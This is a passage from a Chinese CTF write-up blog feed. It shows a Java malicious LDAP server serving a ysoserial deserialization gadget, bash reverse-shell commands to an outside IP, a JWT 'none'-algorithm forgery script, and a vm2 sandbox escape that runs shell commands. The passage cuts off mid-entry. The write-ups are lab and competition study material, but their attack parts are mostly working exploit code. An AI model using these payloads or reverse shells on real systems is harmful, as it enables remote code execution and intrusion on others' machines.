class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HackerLDAPRefServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    ldap_port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(<span class="string">"http://"</span>+http_server+<span class="string">":"</span>+http_port+<span class="string">"/#Exploit"</span>)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/** Payload1: Return Reference Factory **/</span></span><br><span class="line">            <span class="comment">// e.addAttribute("javaCodeBase", cbstring);</span></span><br><span class="line">            <span class="comment">// e.addAttribute("objectClass", "javaNamingReference");</span></span><br><span class="line">            <span class="comment">// e.addAttribute("javaFactory", this.codebase.getRef());</span></span><br><span class="line">            <span class="comment">/** Payload1 end **/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload2: Return Serialized Gadget **/</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64</span></span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>,Base64.decode(<span class="string">"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAUXQAA2FwcHQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAAM3EAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXlxAH4AAUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AAXhwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAFWwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAvAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AL3NxAH4AKHVxAH4ALAAAAAJwdXEAfgAsAAAAAHQABmludm9rZXVxAH4ALwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ACxzcQB+ACh1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAAEY2FsY3QABGV4ZWN1cQB+AC8AAAABcQB+ADRzcQB+ACRzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/** Payload2 end **/</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"HttpServerAddress: "</span>+<span class="string">"127.0.0.1"</span>);</span><br><span class="line">        System.out.println(<span class="string">"HttpServerPort: "</span>+<span class="string">"1234"</span>);</span><br><span class="line">        System.out.println(<span class="string">"LDAPServerPort: "</span>+<span class="string">"1233"</span>);</span><br><span class="line">        String http_server_ip = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="keyword">int</span> ldap_port = Integer.valueOf(<span class="string">"1234"</span>);</span><br><span class="line">        <span class="keyword">int</span> http_server_port = Integer.valueOf(<span class="string">"1233"</span>);</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/27/x82nmeYpjRWqBLv.png" alt="Snipaste_2020-04-27_18-34-05.png"></p><p><img src="https://i.loli.net/2020/04/27/UBt5XkeOwAn3ujy.png" alt="Snipaste_2020-04-27_18-30-04.png"></p><p>成功，但是这里需要反弹shell</p><p>使用ysoserial生成payload，使用<code>bash -i &gt;&amp; /dev/tcp/174.0.194.66/1234 0&gt;&amp;1</code>会失败，</p><p>因为<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要进行一次编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMC4xOTQuNjYvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &#39;curl 174.0.194.66&#39;|base64|xargs echo -nTIzNC5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMC4xOTQuNjYvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;|base64|xargs echo -n</span><br></pre></td></tr></table></figure><p>反弹shell成功。也可以试试wp的CC8那条链</p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="wp" scheme="https://glotozz.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>vulhub-wp</title>
    <link href="https://glotozz.github.io/2020/04/20/vulhub-wp/"/>
    <id>https://glotozz.github.io/2020/04/20/vulhub-wp/</id>
    <published>2020-04-20T03:15:57.000Z</published>
    <updated>2020-04-27T14:42:47.422Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f7e3417b74cf641c08c45b1e4b6a192520d5ea288c7af321382059ad2c4598eb"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="wp" scheme="https://glotozz.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic反序列化漏洞-CVE-2018-2628分析</title>
    <link href="https://glotozz.github.io/2020/04/20/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2018-2628%E5%88%86%E6%9E%90/"/>
    <id>https://glotozz.github.io/2020/04/20/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2018-2628%E5%88%86%E6%9E%90/</id>
    <published>2020-04-19T16:24:50.000Z</published>
    <updated>2020-04-20T05:13:14.435Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="61a15b74fb6961f8eed18f1db3fecfe2041e3797e52184791eacea51aca0e525">55d96a2fa27dbc874898e0362dde5b24f28d899b877049cdd7d22059470309af5eecf3920822b7658efe36756680303f8e9073538126be0c55251b319e70271461228b7d366eac090f391d6520cd0b22bf49d13408f159aad4390bac20c168abf4c12cfb29c40217c8d08a9cda2e6dc2b58317391afa16f1972636c08233ffd48a4a3dbe0a0c282eb441523bf352ef2010a129c280dfca0931076587ef71c84e829ccc5f269f333fb640e81a48843465abf37b66bc68dfdd32a9fa59098ec89e160f3a1186c4a1e68b46093542da9cc15703f20a534579a4c3ecc9696fc6f55bfb97a66ff39e6f7db5a43053c10850067629051be84516fcea04881a856eb7c79ecf4fa0c371b825c7844c4f182c441fa9bc2f0230a022c4cf5770f55e04726c355dcfead92a34609d4e203573ccf8bf8184aa0eca5af223795090b614c66665ae901f611929b35297920735b0fe6cb3e6532142823a9a56dd105b3bd2014d4958b180fd659da230989316866b9798883c388b235d6776d8e260894632d6c6120fc5fb6a3293f6c918c20cc9c56ce8e56ebb5f8b582951971dbfff9ef4af7ba30070f2b5c8ce423b4512e776450b1866991a720981fc2b34c3b9bb3242c05765d20e789303b31264de37231cad01aed4a4dd1e79d2c7ee5c5f60af4bae19e52d90f8ec066d2fde3f9eb3bdfc4594db5f5035964928805f8a76f5c0fef38e743fe4da1f46f3858ae6c60d8cacd73b236436a881bed83526790e5dec8f78c4a45e22c407106d10e88387ad5b076ddd848982f22b5d536dfef22defd8a9e2a4f7270aa70a53d39f866c001700675d60f57609ee773647bee96de06981ae01a4afbdf07a7f9a7198065d6fa274f4c0f610c9a03059193329c948be8ad3fc178a1b3922f44483528ec62dafa5f8c1d6f0654ba8fff51973d2ff8374e95aa03e4247cb714286b749ab2fe3b2bef6d2abd9e96cfa4daf7e89a8d735eadac0cfa5e9701421607f882de62d04d23434381528f3bd41a92a5b513b3ad8836e10fd417c32493bc6a418b30bdd9ef193ff8dba655cd0b565eff76ac091592c3c5bf7f1feacd26088a1868e11c7e92e8bc9d9fb384fba12b0ae16b3a7587112f00463d19bfcc965607432cf6e874286f2f81a9e72cb53b9f2fd753a5d2b298213b5dd2b961b4547c7058a70560c1f99eedd9cb3defb1a4c0f253d95b9b30be1968df14f828cbef732ae7f6d0fdaebd6472e36bcddfa5decca8f33abbf7b36bbf1605248630345fc37409d08c6557126ed6032fcf01249204d942ff5e8a4b1bd2760c6ab6e90f7eef1baeaf013274f9277902d6b4d6a2c64ef89d8b8aa909f85299b592a3bf52326bd4d6f3731a3a5af28d81c8d56ddbcdb0f56c17164995d7c948a7c44031eef9300a42de1d595fff8f52ff5ec50cf01351a9d79dd40e01a38f48ba67f571e0af451689437ec59d7da0c321d8f6584d08e9529c304826c803acb588c8f5206c853e4daa5ef4ae0afa38e0baada63c5b05bb638f7c64f17381e114f87aa18ab5bf11053789724e53dc1855ef978ae47f54f20b690cd54f4e60ace6909216576cfddccc8dfb4129df2caf44be10c6c3ba0d0f8269a5ccb8f3a4fb8fda073e5568e518bf622cb3f6c78c5bf58dc3360daf84daf51a12aed7d5b4a40f8f031e42db2a8ab26b60b3e0f652b481460c3f4097436e53a30f14ee7f856edda3dcadec9181ddb666869501e4e3af01f0341676fbbf4eb82075a6c0c9f5755a3ebb3ef400696f494af180edf5ad2b8a74e0b84e7bcf7da70009d818692eca0436e875d187c9b9bed334ba2f5febf49f3726fab37b2aedc9ed4eab5cd0f4facb19e0c385f3b87f78a386ccb54b88f72d527054fe6a85c66a2419976284054dbd64e0aee9e69afae084506a11d1d141eb8859a27fa4281467251580e04fcedb171a57aa7c5b7117f4b45d8cf1a9a349354d6bcf8d0b092e89afdc07a975b1c07d1a5e6f95362fe01570e7f2778d217817cc884d41d546aa579ce3a809e6238d92d2f3aa979dd32d21773d6f3bbde7654a1e0346f3999a5ef723826ce34373bfb312592efaec7ac41ee7676ab957ae99c8301f73584c7d9791703ac8c809fe283159eb9704aa482128a97c750e75fbac5376a11ad3b4d8d6f974e2b5c54c42252d71151d83f4d7457c193b836ad960309848178130bf58a7e286c4d063b4e05bcb48504aee40c90fe0fc425bce9e64edfa713c4bfe783a8b04a08f3e9eb274b9a7a529e46cecbcae451183c0993d4e9318b59296dea4ed84e34cf0927c3f5aec52fe903f366f806c18028478cbfcf2d04effa4f004a76e706c4270a7c81baed82c0c146737ebfdb0c76aa7ee5441a57d0667a337db7aee9efd63be0d1965e4e72556aae71dd407e04054e10a4552675baffd8203d6612cb57ae423125e9029a04c4fd0b345943c61781ebb011b18acd5712b1c734754d1a2de208bf6c2bc3eec4a4b6446a01a1f120416d2cdaca018cba2424c6d5219b1adb53a19054eed5819f8c1d5bcd0723bdd47a2e5f1b182932ad9c78dacb80ae557a81ffddc4e05030591683657bba2e949ee8194b199a7879c8bf1453af457bc395ceb32f81b6c25bfdcfc648ca056915e53010dd0a841d7c1ca9ed86ed35425f7e0dc3f829d194db1a1497f883b798fdc98f9811f21d2f8c7c76a61238c23aca5a44401c0496d7a3d30377a7477cac890f0dd6534f348343d34a38d74b0e2c5dc22d6948660b425237dd3ffd54764660723bb66f983c643b2f489903868605f13e0220be0f9f3d67481311afad882cc7eba201afa6a54e933487035cf9471bfcc5404d49324899dca1b5b92bf529d1e3d9b831e704fc245ff2ad626e2169440697ac7f4b54da7430ee28859efee3741ceac3f938c8e0d146eafd89222f7dc544077498bb2181b36affe9f7fd6183d098a344e959dfd0217e6b81bb1f1bcd4d8ac78fad1af524bfb66e41adc8aaadeda8c9a0a3abe2365ff0a2b86a8831af01dd2cf51e1eae6966cbbf384f7a16e1002d279bfb773cf07263596c128e2284dc44aed75b63151f7cfaffbd0ced3795d7e1de4286521050c108edb6e95698670eeef0370543163b2c78909321c2505c986229edfe689390fa81616521500b8d92e134a90916f19b5a60e7dc4dbe3a3783c526fa8e3e81e2ee926f37f9bab0c8e60af5db31e0cc8840bd2608dd2accbd22868d6c5aa68938506cdcca8306375fed593679bde3debd5304a0dd8cdc775d4139a7f5d9bcb1b81eb8383ab1d8d7e540d14690f020f614379a358cb99325fc6184ee200629b1f5da32398099f1da4736de6049770f466653ae6f08d1a08e98509d8c73d0e0b59e8501dee9cfc291db945e534dab3cfdafc55e2c51421f0ab8af7060eb3f9e492dd415d38b2ef8a2634aa108047e503d816dadf6d63ecfa0edde6e579c34c59dc4af425a9eafc524feceab1d392558ef73876847cac62ff322a902a3a3efa434ec65bb9e8becc68328e7c0195de79fea02928fae3674f9f863310347cf2e212a880b03f5ac96500c551df8c247b270c4793d561568de430d7f8daa0e620227d2bbf8561d2a07306f71cdc166dec900a638841ba8d0d3ba79bb1fe70af6050cdecae3322cbb5b7fc5aed8b63d443a0c67c0009f042bb465a1423de3c7ee66043eefc0a697ec24c4790e04b8b0bfb33bb881e1a8bd9a64350031bb2400dd7bf59441b822b804706474f2a1353cd8389cc1921798d0e554243e5c2cffd68b3ce01d186018a6ca99a8a1bf14cbb37bdb33fe55911decae6ee72e1f75d4ff6e4a627f34c70d00cd387ec588e1e2f1c5715080252d9679217f42f8c7e27f89ed2c69f0c2a6913a41d3f1ec4f6752234f0a7274bf063f8ca1e3ae3705f7c35d0e99b12fe10692b8d55066ebefc99e467910660eb45dd721e60234b7e5985e00df67fdd42be8519317f1a2988aab8c82703f6f068fd03aea694c61970d2de7a569413af730568aaf5f9e3d9130239a4632f812fa9cbdc51a0ae3fd256a3c63459c67c68f6aabd185ae406f85de9b9cf5e5f5a44c39f985d98aacd42b3686616f17078ba90125f3c828600aab591cc51920fee975b113d654df93ba5022e3ebc5d143c47b19a010fc95a05a4a59f168356c374c889ae230a0fb500fbd18b111144eba77deaa99e70fc7b1c6e42c9035691cf82b5338259db73253fb45952445ee734900bd90c8f9a9493d277c71b89da8e3ab5f9fc301b774ef09d6703c032537e35f19be11c228dff4adb3dd380560f254ade4a20ae1bd90200c5cab30f64b00746ec6e93ad3816d0ef5050f98ec44435283aee5e598190b39587f80455f7a3724bd8d0d7138f1a07a5976c3ec521f9b93b8b5e6e42fd4e5d74bec1625455b943b23132c3fdc484e7e1eb5acf168852899a47a66f2d7cbfe80886bdb653e8ad683800e902c6af9fba688314328688083811ef183c3b60dafa199faca29a71507226285b4a42764cb1b474a9bfb98f4ee6073374c20905f1c1daeb916f781894a79cd85cdb5dbe06de26221e034918fd6ae6d8a483678cd63ab140d5e52fc0095125571a1304beceaa887bf70a7ba9df79ed4969df337ee759b47d29efb35e6b95ac85e427cdfe789f1691b9ea804ff3586efc623a65c2535be2d56564c4a805c275128b25a2bf5880fdc2316fc314477e8a060477ff0e340a895406dd6a2fe151a71e92435c7cab07d8448722fadfbeca86dc1ba296d4d389694f8823efe0fa6b250f5c2ce7c2cc7cda305e056be9010df03e3428d26eb3ddab02f268f90c4ff94d0458ffb4731baeaf5321ed9671bd33c9ae9c6fda0ca4658b2634602e148af7b0795ecef9d3ac6d4e3c364037bca7dec2c6af678c9742ae8c3804633b9079c6312f7d76298636d84d7fb502d46c806f774ec768eda70afd041bd294b816bd17b64842e4593b694050738e369daacfc215e500e60fb4ad89ea696cad5f47fb0b1dcbfa70fa239d51b3da7bd9c959f133e4980286642b36b1c809b17b0fd583f935bf6d16f2082ec1ba8f817a1119119026d726d62fd9b61e42bd33bc09075abd30001fa6733def22316f922ca3ef496fa7ef6259c220b11ed28e9f687deeddbb5f569994f2c82c1ab0040f6a40df65e31a87e02ae35141ea716d6f90ff64eab07e268b8d081d4a46d4243728f0f910f862414dfa78c38c62db8bb64bef82e6114d454f4011623353a93a56d87f5cf72d87bdbe4246b70fece23c6e15d941241d4be5d85d6158a77fcda4aefe5c6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF-wp</title>
    <link href="https://glotozz.github.io/2020/04/19/HFCTF-wp/"/>
    <id>https://glotozz.github.io/2020/04/19/HFCTF-wp/</id>
    <published>2020-04-19T11:21:38.000Z</published>
    <updated>2020-04-21T01:55:23.968Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#easylogin">EasyLogin</a></li><li><a href="#justescape">JustEscape</a></li><li><a href="#babyupload">BabyUpload</a></li></ul><!-- tocstop --><hr><h3><span id="easylogin">EasyLogin</span></h3><p>根据提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  或许该用 koa-static 来处理静态文件</span><br><span class="line"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>存在任意文件读取，读到<code>/app.js</code>、<code>/rest.js</code>、<code>/controller.js</code>、<code>/controllers/api.js</code></p><p><img src="https://i.loli.net/2020/04/19/feHQjrUblK57D1G.png" alt="Snipaste_2020-04-19_20-39-48.png"></p><p>这里的<code>sid</code>是用户可修改的，而<code>user</code>经过会jwt验证，，而当用户传入jwt <code>secret</code>为空时 <code>jsonwebtoken</code>会采用algorithm none进行解密 </p><p>本来可以传一个不存在的数组下标，但是这里最后一个条件限制了<code>sid&gt;length &amp;&amp; sid&gt;=0</code>，只能利用弱类型绕过，这里<code>[]</code>或者<code>&quot;&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip3.6 install pyjwt</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">"secretid"</span>:&#123;&#125;,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"admin"</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>登录得到flag</p><h3><span id="justescape">JustEscape</span></h3><p>后端报错，发现是nodejs的vm，</p><blockquote><p>逃逸：<a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">        Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">            getOwnPropertyDescriptor()&#123;</span><br><span class="line">                throw f&#x3D;&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">         e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用数组绕过过滤<code>code[]=</code></p><p>还可以利用js中<code>[]</code>代替<code>.</code>    比如<code>a.b==a[b]</code></p><p>反引号代替双引号等，</p><p>赵总利用模板字符串嵌套 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure><h3><span id="babyupload">BabyUpload</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 